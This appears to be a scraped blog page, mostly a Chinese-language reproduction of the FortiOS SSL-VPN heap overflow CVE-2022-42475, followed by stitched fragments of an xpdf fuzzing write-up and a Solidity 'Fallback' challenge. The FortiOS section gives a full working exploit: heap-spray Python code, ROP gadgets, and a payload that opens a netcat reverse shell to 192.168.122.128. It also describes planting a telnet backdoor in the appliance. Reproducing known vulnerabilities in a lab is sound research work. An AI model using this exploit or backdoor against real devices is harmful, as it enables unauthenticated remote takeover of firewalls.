&lt;p&gt;/bin/init中存在几个针对文件系统是否被修改的检查&lt;br&gt;
通过启动时打印的&lt;code&gt;System is starting&lt;/code&gt;定位函数&lt;br&gt;
如果check失败会重启，这里我们将其do_halt函数第一条改成ret&lt;br&gt;
![[Pasted image 20240812213039.png]]&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240812213049.png&#34; alt=&#34;Pasted image 20240812213049.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;debugstub调试&#34;&gt;debugStub调试&lt;/h2&gt;
&lt;p&gt;断在&lt;code&gt;fgt_verify&lt;/code&gt;这里将返回值改为0即可进入if分支，同时将&lt;code&gt;/sbin/init&lt;/code&gt; patch为 &lt;code&gt;/bin/init&lt;/code&gt;，从而直接执行&lt;code&gt;/bin/init&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240809110446.png&#34; alt=&#34;Pasted image 20240809110446.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240809105240.png&#34; alt=&#34;Pasted image 20240809105240.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;b *0xffffffff807ac117
c
ni
set $rax = 0
patch string 0xffffffff808f3591 &amp;quot;/bin/init&amp;quot;
patch byte 0xffffffff808f3591+9 0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240809111721.png&#34; alt=&#34;Pasted image 20240809111721.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;patch成功后便能正常启动&lt;/p&gt;
&lt;p&gt;此时输入&lt;code&gt;diagnose hardware smartctl&lt;/code&gt;开启telnet后门 (记得编译后门和busybox的时候用对glibc版本，可以到文件系统下的lib/libc.so.6找，这个版本的最高支持到GLIBC_2.30&lt;br&gt;
否则就会像下面这样&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240809112152.png&#34; alt=&#34;Pasted image 20240809112152.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;另外注意编译busybox的时候开启standalone shell，不然会提示applet not found&lt;br&gt;
后门&lt;code&gt;/bin/busybox ash --login -s&lt;/code&gt;即是开启standalone shell&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240809154630.png&#34; alt=&#34;Pasted image 20240809154630.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞验证&#34;&gt;漏洞验证：&lt;/h2&gt;
&lt;p&gt;根据：FortiOS sslvpnd 中存在基于堆的缓冲区溢出漏洞，可利用该漏洞在未经身份验证的情况下通过特制请求远程执行任意命令或代码&lt;br&gt;
已知由Content-Length引起&lt;br&gt;
这里用fuzz脚本测试:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
import ssl

path = &amp;quot;/remote/login&amp;quot;.encode()
content_length = [&amp;quot;0&amp;quot;, &amp;quot;-1&amp;quot;, &amp;quot;2147483647&amp;quot;, &amp;quot;2147483648&amp;quot;, &amp;quot;-0&amp;quot;,
                  &amp;quot;4294967295&amp;quot;, &amp;quot;4294967296&amp;quot;, &amp;quot;1111111111111&amp;quot;, &amp;quot;22222222222&amp;quot;]

# 2147483647 int max
# 2147483648 max+1 -&amp;gt; -2147483648
# 4294967295 unsigned int max
# 4294967296 max+1 -&amp;gt; 0
# 1111111111111
# 2222222222222

for CL in content_length:
    print(&amp;quot;[+] &amp;quot;+str(CL)+&amp;quot; :&amp;quot;)
    try:
        data = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: 192.168.122.99\r\nContent-Length: &amp;quot; + \
            CL.encode() + b&amp;quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&amp;quot;
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _default_context = ssl._create_unverified_context()
        client = _default_context.wrap_socket(client)
        client.connect((&amp;quot;192.168.122.99&amp;quot;, 1443))
        client.sendall(data)
        res = client.recv(1024)
        if b&amp;quot;HTTP/1.1&amp;quot; not in res:
            print(&amp;quot;Error detected&amp;quot;)
            print(CL)
            break
    except Exception as e:
        print(e)
        print(&amp;quot;Error detected&amp;quot;)
        print(CL)
        break

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以发现在CL设置为2147483647时出现错误&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240814150311.png&#34; alt=&#34;Pasted image 20240814150311.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
gdbserver调试，使用telnet的23端口：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;killall telnetd &amp;amp;&amp;amp; /bin/gdbserver 192.168.122.99:23 --attach $(ps|grep sslvpn|grep -v grep|awk &#39;{print $1}&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240814153201.png&#34; alt=&#34;Pasted image 20240814153201.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
backtrace:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;pwndbg&amp;gt; bt
#0  0x00007f8cfaa4476d in __memset_avx2_erms () from target:/usr/lib/x86_64-linux-gnu/libc.so.6
#1  0x000000000164e5d9 in ?? ()
#2  0x0000000001785ac2 in ?? ()
#3  0x000000000177f48d in ?? ()
#4  0x0000000001780b40 in ?? ()
#5  0x0000000001780c1e in ?? ()
#6  0x0000000001781131 in ?? ()
#7  0x00000000017823dc in ?? ()
#8  0x0000000001783762 in ?? ()
#9  0x0000000000448ddf in ?? ()
#10 0x0000000000451eba in ?? ()
#11 0x000000000044ea1c in ?? ()
#12 0x0000000000451128 in ?? ()
#13 0x0000000000451a51 in ?? ()
#14 0x00007f8cfa90ddeb in __libc_start_main () from target:/usr/lib/x86_64-linux-gnu/libc.so.6
#15 0x0000000000443c7a in ?? ()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;跟踪到最后memset调用处&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;void *__fastcall pool_alloc(__int64 a1, size_t a2)
{
  _QWORD *v2; // rax
  char *v3; // r8
  unsigned __int64 v4; // rbx
  unsigned __int64 v7; // rdi
  __int64 v8; // rax

  v2 = *(_QWORD **)(a1 + 8);
  v3 = (char *)v2[2];
  if ( a2 )
  {
    v4 = 8LL * (int)(((a2 - 1) &amp;gt;&amp;gt; 3) + 1);
    if ( (unsigned __int64)&amp;amp;v3[v4] &amp;gt; *v2 )
    {
      v7 = dword_A8AC5A4 - 25;
      if ( v7 &amp;lt; v4 )
        v7 = 8LL * (int)(((a2 - 1) &amp;gt;&amp;gt; 3) + 1);
      v8 = sub_164E140(v7);
      *(_QWORD *)(*(_QWORD *)(a1 + 8) + 8LL) = v8;
      *(_QWORD *)(a1 + 8) = v8;
      v3 = *(char **)(v8 + 16);
      *(_QWORD *)(v8 + 16) = &amp;amp;v3[v4];
    }
    else
    {
      v2[2] = &amp;amp;v3[v4];
    }
  }
  else
  {
    v3 = 0LL;
  }
  return memset(v3, 0, a2);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中最后return的memset的a2参数来源于sub_17859D0中&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  v1 = (__int64 *)a1[92];
  v2 = sub_17901D0(a1[83]);
  v3 = v2;
  if ( !*(_QWORD *)(v2 + 8) )
    *(_QWORD *)(v2 + 8) = pool_alloc(*v1, *(_DWORD *)(v2 + 24) + 1);// Content-Length 取4字节+1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;现在poc触发时CL为2147483647，即0x7fffffff&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mov     eax, [rax+18h]
mov     rdi, [r12]
lea     esi, [rax+1]
movsxd  rsi, esi
call    pool_alloc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里movsxd为带符号扩展传送指令&lt;br&gt;
将32位扩展为64位，当扩展一个负数的时候需要将扩展的高位全赋为1.对于正数而言，符号扩展和零扩展movzx是一样的，将扩展的高位全赋为0，而0x7fffffff+1后最高位符号位为1，所以经过扩展后rsi寄存器值为0xffffffff80000000，传递给memset转换为size_t无符号整数会导致内存溢出，崩溃&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; ► 0x164e5d4    call   memset@plt                      &amp;lt;memset@plt&amp;gt;
        s: 0x7f8cf4a556c8 ◂— 0x0
        c: 0x0
        n: 0xffffffff80000000
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;而我们需要利用这一点，使得pool_alloc的堆块大小小于下方memcpy时位扩展后的大小，从而导致堆溢出&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;v1 = (__int64 *)a1[92];
  v2 = sub_17901D0(a1[83]);
  v3 = v2;
  if ( !*(_QWORD *)(v2 + 8) )
    *(_QWORD *)(v2 + 8) = pool_alloc(*v1, *(_DWORD *)(v2 + 24) + 1);// Content-Length 取4字节+1 ， 分配小堆块
  v4 = sub_1662AC0(v1, v3 + 32, 8190LL);
  v5 = v4;
  if ( v4 )
  {
    if ( v4 &amp;lt; 0 )
    {
      if ( (unsigned int)sub_16593E0(a1[77]) - 1 &amp;lt;= 4 )
        return 0LL;
    }
    else
    {
      v6 = *(int *)(v3 + 16);
      v7 = *(_QWORD *)(v3 + 24);
      if ( (int)v6 + v4 &amp;gt; v7 )
        v5 = *(_QWORD *)(v3 + 24) - v6;
      if ( v7 &amp;gt; v6 )
      {
        memcpy((void *)(*(_QWORD *)(v3 + 8) + v6), (const void *)(v3 + 32), v5); // 堆溢出
        v10 = *(_QWORD *)(v3 + 24);
        v11 = *(_DWORD *)(v3 + 16) + v5;
        *(_DWORD *)(v3 + 16) = v11;
        if ( v11 &amp;lt; v10 )
          return 0LL;
      }
      else
      {
        v8 = *(_DWORD *)(v3 + 16) + v5;
        *(_DWORD *)(v3 + 16) = v8;
        if ( v8 &amp;lt; v7 )
          return 0LL;
      }
    }
  }
  return 2LL;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们构造CL为0x100000000，断在0x1785ABD处，可以看出在经过位扩展后传入参数为1&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt; →  0x1785abd                  call   0x164e590
   ↳   0x164e590                  push   rbp
       0x164e591                  mov    rbp, rsp
       0x164e594                  push   r13
       0x164e596                  push   r12
       0x164e598                  mov    r12, rsi
       0x164e59b                  push   rbx
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────0x164e590 (
   $rdi = 0x00007f146c2fa018 → 0x00007f146c2fa000 → 0x00007f146c2fa400 → 0x00007f146c2fa800 → 0x0000000000000006,
   $rsi = 0x0000000000000001
)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后到memcpy处&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;memcpy@plt (
   $rdi = 0x00007f146c2fa818 → 0x0000000000000000,
   $rsi = 0x00007f146c342038 → &amp;quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]&amp;quot;,
   $rdx = 0x0000000000001000,
   $rcx = 0x0000000000000000
)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此处可以发送超长data，能够堆溢出&lt;/p&gt;
&lt;h2 id=&#34;漏洞利用&#34;&gt;漏洞利用：&lt;/h2&gt;
&lt;p&gt;现在能够进行堆溢出，但是如何劫持执行流呢，这里参考下面文章:&lt;br&gt;
https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&lt;br&gt;
由于fortios虚拟机中只有一个web守护进程，使用epoll()处理连接，所以所有连接的所有内存操作都会在同一块堆上进行&lt;br&gt;
而当我们发送HTTP请求时，会在堆上分配SSL结构体&lt;br&gt;
而如果劫持SSL结构体中&lt;code&gt;*handshake_func&lt;/code&gt;的函数指针，就能劫持执行流&lt;br&gt;
所以现在的思路是：通过发送多个正常的HTTP请求在堆上喷射SSL结构体，再通过堆溢出覆盖这些结构体的函数指针达到劫持执行流的效果&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240815173039.png&#34; alt=&#34;Pasted image 20240815173039.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;相关汇编@sub_1780A20:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;.text:0000000001780B00 48 8B 82 C0 00 00 00          mov     rax, [rdx+0C0h]
.text:0000000001780B07 4C 89 EF                      mov     rdi, r13
.text:0000000001780B0A 48 85 C0                      test    rax, rax
.text:0000000001780B0D 0F 84 85 00 00 00             jz      loc_1780B98
.text:0000000001780B0D
.text:0000000001780B13 5B                            pop     rbx
.text:0000000001780B14 41 5C                         pop     r12
.text:0000000001780B16 41 5D                         pop     r13
.text:0000000001780B18 41 5E                         pop     r14
.text:0000000001780B1A 5D                            pop     rbp
.text:0000000001780B1B FF E0                         jmp     rax
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因此，我们可以将之前的fuzz脚本按照以下思路改造:&lt;br&gt;
（某些步骤不一定需要或者有用）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. 创建 60 个 sock 连接，并发送不完整的 http 请求，希望能在服务端分配多个 SSL 结构体
2. 从第 40 个开始间隔释放 10 个 sock 链接，希望在服务端释放几个 SSL 结构体的 Hole.
3. 分配用于溢出的 exp_sk
4. 再分配 20 个 sock 连接，多分配几个 SSL 结构体
5. 触发溢出，希望修改 SSL 结构体中的函数指针
6. 给其他 socket 发送数据，等待函数指针调用
7. 劫持函数指针后，切换栈到可控数据区，然后 ROP 计算栈地址，调用 mprotect 让栈区有可执行权限
8. jmp esp 跳转到栈上的 shellcode 执行。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以上是按照ret2mprotect的打法来的，这里我们poc直接打rop，利用我们上传的busybox演示即可&lt;br&gt;
注意前面创建的socks连接目的是为了让堆平顺一点，真正溢出的是payload所在socks之后的连接&lt;br&gt;
这里以前创建的socks连接里面CL的大小会影响堆上分配的结构体，我们选择2000，触发概率大一点&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
import ssl
from pwn import *

ip = &amp;quot;192.168.122.99&amp;quot;
port = 1443


path = &amp;quot;/remote/login&amp;quot;.encode()
# content_length = [&amp;quot;0&amp;quot;, &amp;quot;-1&amp;quot;, &amp;quot;2147483647&amp;quot;, &amp;quot;2147483648&amp;quot;, &amp;quot;-0&amp;quot;,
#                   &amp;quot;4294967295&amp;quot;, &amp;quot;4294967296&amp;quot;, &amp;quot;1111111111111&amp;quot;, &amp;quot;22222222222&amp;quot;]

content_length = &amp;quot;115964116992&amp;quot;

# 2147483647 int max
# 2147483648 max+1 -&amp;gt; -2147483648
# 4294967295 unsigned int max
# 4294967296 max+1 -&amp;gt; 0
# 1111111111111
# 2222222222222

# 0x000000000043a016 : ret
ret = 0x000000000043a016
counter = 0


def create_ssl_ctx():
    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _default_context = ssl._create_unverified_context()
    _socket = _default_context.wrap_socket(_socket)
    _socket.connect((ip, port))
    return _socket


socks = []

for i in range(60):
    sk = create_ssl_ctx()
    data = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: 192.168.122.99\r\nContent-Length: 2000\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&amp;quot;
    sk.sendall(data)
    socks.append(sk)


# payload = B&amp;quot;A&amp;quot;*2592+p64(0xdeadbeef)
# payload = payload.ljust(0x2000, b&amp;quot;A&amp;quot;)
payload = cyclic(0x4000)
print(&amp;quot;[+] &amp;quot;+str(content_length)+&amp;quot; :&amp;quot;)
data = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: 192.168.122.99\r\nContent-Length: &amp;quot; + \
    content_length.encode() + \
    b&amp;quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n&amp;quot;+payload
client = create_ssl_ctx()


for i in range(20, 40, 2):
    sk = socks[i]
    sk.close()
    socks[i] = None


client.sendall(data)


for sk in socks:
    if sk:
        data = b&amp;quot;b&amp;quot; * 40
        sk.sendall(data)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;为了方便调试，我们构造payload为cyclic(0x4000)，有概率断在&lt;code&gt;0x1780B1B&lt;/code&gt;处执行&lt;code&gt;jmp rax&lt;/code&gt;，此时偏移为3616&lt;br&gt;
可以劫持执行流&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240818183810.png&#34; alt=&#34;Pasted image 20240818183810.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;观察此时内存布局，并结合之前的汇编&lt;code&gt;mov     rax, [rdx+0C0h]&lt;/code&gt;，我们可以在rdx地址上存储我们的rop链，并在&lt;code&gt;+0xc0&lt;/code&gt;偏移处(即poc中的ret)存放我们的pivot gadget，并且gadget需要包含&lt;code&gt;push rdx ; pop rsp&lt;/code&gt;，从而迁移到rop链处&lt;/p&gt;
&lt;p&gt;init太大，输出到txt文件查找:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ROPgadget --binary &amp;quot;./init&amp;quot; &amp;gt; 3.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最终我们选择&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;0x0000000000febbaa : push rdx ; pop rsp ; add eax, 0x83480deb ; ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;剩下的gadget就比较好找了，注意最后堆上有脏数据记得padding&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240818204930.png&#34; alt=&#34;Pasted image 20240818204603.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
import ssl
from pwn import *

ip = &amp;quot;192.168.122.99&amp;quot;
port = 1443


path = &amp;quot;/remote/login&amp;quot;.encode()
# content_length = [&amp;quot;0&amp;quot;, &amp;quot;-1&amp;quot;, &amp;quot;2147483647&amp;quot;, &amp;quot;2147483648&amp;quot;, &amp;quot;-0&amp;quot;,
#                   &amp;quot;4294967295&amp;quot;, &amp;quot;4294967296&amp;quot;, &amp;quot;1111111111111&amp;quot;, &amp;quot;22222222222&amp;quot;]

content_length = &amp;quot;115964116992&amp;quot;

# 2147483647 int max
# 2147483648 max+1 -&amp;gt; -2147483648
# 4294967295 unsigned int max
# 4294967296 max+1 -&amp;gt; 0
# 1111111111111
# 2222222222222

# 0x000000000043a016 : ret
ret = 0x000000000043a016
counter = 0


def create_ssl_ctx():
    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _default_context = ssl._create_unverified_context()
    _socket = _default_context.wrap_socket(_socket)
    _socket.connect((ip, port))
    return _socket


socks = []

for i in range(60):
    sk = create_ssl_ctx()
    data = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: 192.168.122.99\r\nContent-Length: 2000\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&amp;quot;
    sk.sendall(data)
    socks.append(sk)

for i in range(20, 40, 2):
    sk = socks[i]
    sk.close()
    socks[i] = None

# payload = cyclic(0x4000)

sys_addr = 0x00000000005693C5
# .text:00000000005693C5 E8 46 58 ED FF                call    _system

pivot_gadget = 0x0000000000febbaa
# 0x0000000000febbaa : push rdx ; pop rsp ; add eax, 0x83480deb ; ret

pop_rax = 0x000000000046bb27
# 0x000000000046bb27 : pop rax ; ret

pop_rax_rcx = 0x000000000060b2fe
# 0x000000000060b2fe : pop rax ; pop rcx ; ret


add_rdx_rax = 0x0000000002a0e0e0
# 0x0000000002a0e0e0 : add rdx, rax ; mov eax, edx ; sub eax, edi ; ret

push_rdx_pop_rdi = 0x000000000257008a
# 0x000000000257008a : push rdx ; pop rdi ; ret

pop_rsi = 0x0000000000530c8e
# 0x0000000000530c8e : pop rsi ; ret

pop_rdx = 0x0000000000509372
# 0x0000000000509372 : pop rdx ; ret

add_rcx_r13 = 0x0000000000aac1d0
# 0x0000000000aac1d0 : add rcx, r13 ; ret

payload = b&amp;quot;B&amp;quot;*(3616-0xc0)
payload += p64(pop_rax_rcx)
payload += p64(0x50)
payload += p64(add_rcx_r13)  # padding
payload += p64(add_rdx_rax)
payload += p64(push_rdx_pop_rdi)
payload += p64(pop_rsi)+p64(0)
payload += p64(pop_rdx)+p64(0)
payload += p64(sys_addr)
payload += b&amp;quot;/bin/busybox nc 192.168.122.128 4444 -e /bin/sh&amp;quot;
payload += b&amp;quot;\x00&amp;quot;
payload = payload.ljust(3616, b&amp;quot;A&amp;quot;)+p64(pivot_gadget)
print(&amp;quot;[+] &amp;quot;+str(content_length)+&amp;quot; :&amp;quot;)
data = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: 192.168.122.99\r\nContent-Length: &amp;quot; + \
    content_length.encode() + \
    b&amp;quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n&amp;quot;+payload
client = create_ssl_ctx()


for i in range(20):
    sk = create_ssl_ctx()
    socks.append(sk)


client.sendall(data)


for sk in socks:
    if sk:
        data = b&amp;quot;b&amp;quot; * 40
        sk.sendall(data)
&lt;/code&gt;&lt;/pre&gt;
">CVE-2022-42475 复现</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/0YuGrllUj/"" data-c="
          &lt;h1 id=&#34;cve-2019-13288-in-xpdf-302&#34;&gt;CVE-2019-13288 in XPDF 3.02&lt;/h1&gt;
&lt;h2 id=&#34;build&#34;&gt;build:&lt;/h2&gt;
&lt;p&gt;build.sh:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/sh
CC=afl-clang-fast CXX=afl-clang-fast++ ./configure --prefix=$PWD/bd
make
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;fuzzing&#34;&gt;fuzzing:&lt;/h2&gt;
&lt;p&gt;start.sh:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/sh
afl-fuzz -i $PWD/ipt -o $PWD/opt -s 123 -m none -- $PWD/bd/bin/pdftotext @@ $PWD/output
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;we get crash below :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;
 american fuzzy lop ++4.09a {default} (.../xpdf-3.02/bd/bin/pdftotext) [fast]
┌─ process timing ────────────────────────────────────┬─ overall results ────┐
│        run time : 0 days, 0 hrs, 48 min, 47 sec     │  cycles done : 0     │
│   last new find : 0 days, 0 hrs, 0 min, 4 sec       │ corpus count : 782   │
│last saved crash : 0 days, 0 hrs, 7 min, 51 sec      │saved crashes : 5     │
│ last saved hang : 0 days, 0 hrs, 4 min, 29 sec      │  saved hangs : 2     │
├─ cycle progress ─────────────────────┬─ map coverage┴──────────────────────┤
│  now processing : 781.0 (99.9%)      │    map density : 2.81% / 4.58%      │
│  runs timed out : 0 (0.00%)          │ count coverage : 4.10 bits/tuple    │
├─ stage progress ─────────────────────┼─ findings in depth ─────────────────┤
│  now trying : trim 64/64             │ favored items : 63 (8.06%)          │
│ stage execs : 47/384 (12.24%)        │  new edges on : 138 (17.65%)        │
│ total execs : 1.10M                  │ total crashes : 5 (5 saved)         │
│  exec speed : 321.8/sec              │  total tmouts : 37 (0 saved)        │
├─ fuzzing strategy yields ────────────┴─────────────┬─ item geometry ───────┤
│   bit flips : disabled (default, enable with -D)   │    levels : 21        │
│  byte flips : disabled (default, enable with -D)   │   pending : 557       │
│ arithmetics : disabled (default, enable with -D)   │  pend fav : 2         │
│  known ints : disabled (default, enable with -D)   │ own finds : 780       │
│  dictionary : n/a                                  │  imported : 0         │
│havoc/splice : 572/451k, 213/333k                   │ stability : 100.00%   │
│py/custom/rq : unused, unused, unused, unused       ├───────────────────────┘
│    trim/eff : 3.39%/310k, disabled                 │          [cpu000:  6%]
└─ strategy: explore ────────── state: in progress ──┘
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;analyze&#34;&gt;analyze:&lt;/h2&gt;
&lt;p&gt;use tmin to minimize the crashes&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/sh
mkdir -p $PWD/opt/default/minimized
for i in $PWD/opt/default/crashes/id* ; do afl-tmin -i $i -o $PWD/opt/default/minimized/`basename $i` -- $PWD/bd/bin/pdftotext @@ $PWD/output ; done
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;rebuild with dbg symbols and feed the crash sample&lt;br&gt;
gdb dbg:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt; gdb --args ./pdftotext id:000000,sig:11,src:000499,time:429922,execs:198634,op:havoc,rep:4 ./1
 start
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;step to the crash point and look up backtrace , we entered a infinete loop at src &lt;code&gt;Parser.cc:94&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;[#0] Id 1, Name: &amp;quot;pdftotext&amp;quot;, stopped 0x7ffff7af1e57 in _int_malloc (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7af1e57 → _int_malloc(av=0x7ffff7c68c80 &amp;lt;main_arena&amp;gt;, bytes=0x158)
[#1] 0x7ffff7af3262 → __GI___libc_malloc(bytes=0x158)
[#2] 0x7ffff7e2c98c → operator new(unsigned long)()
[#3] 0x5555555e2ca3 → FileStream::makeSubStream(this=0x555555693c00, startA=0xa, limitedA=0x0, lengthA=0x0, dictA=0x7fffff7ff130)
[#4] 0x5555555f7a7c → XRef::fetch(this=0x555555695230, num=0x4, gen=0x0, obj=0x7fffff7ff1e0)
[#5] 0x5555555e016f → Object::dictLookup(obj=0x7fffff7ff1e0, key=0x55555560c1c6 &amp;quot;Length&amp;quot;, this=0x7fffff7ff3a0)
[#6] 0x5555555e016f → Parser::makeStream(this=0x555556bc5a60, dict=0x7fffff7ff3a0, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0x0, objNum=0x4, objGen=0x0)
[#7] 0x5555555e071c → Parser::getObj(this=0x555556bc5a60, obj=0x7fffff7ff3a0, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0x0, objNum=0x4, objGen=0x0)
[#8] 0x5555555f7bbd → XRef::fetch(this=0x555555695230, num=0x4, gen=0x0, obj=0x7fffff7ff3a0)
[#9] 0x5555555e016f → Object::dictLookup(obj=0x7fffff7ff3a0, key=0x55555560c1c6 &amp;quot;Length&amp;quot;, this=0x7fffff7ff560)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;here causes a recursion, will finally run out of stack memory&lt;/p&gt;
&lt;h2 id=&#34;mitigation&#34;&gt;mitigation:&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;#define recursionLimit 500&lt;/code&gt; and exit after reaching the limit .&lt;/p&gt;
&lt;h1 id=&#34;cve-2009-3895-cve-2012-2836-in-libexif-0614&#34;&gt;CVE-2009-3895 CVE-2012-2836 in libexif 0.6.14&lt;/h1&gt;
">Fuzzing101</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/3TfrFzmb/"" data-c="
          &lt;h2 id=&#34;fallback&#34;&gt;Fallback&lt;/h2&gt;
&lt;p&gt;our goal :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;claim ownership of the contract&lt;/li&gt;
&lt;li&gt;reduce its balance to 0&lt;br&gt;
original contract:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address =&amp;gt; uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, &amp;quot;caller is not the owner&amp;quot;);
        _;
    }

    function contribute() public payable {
        require(msg.value &amp;lt; 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] &amp;gt; contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value &amp;gt; 0 &amp;amp;&amp;amp; contributions[msg.sender] &amp;gt; 0);
        owner = msg.sender;
    }
}
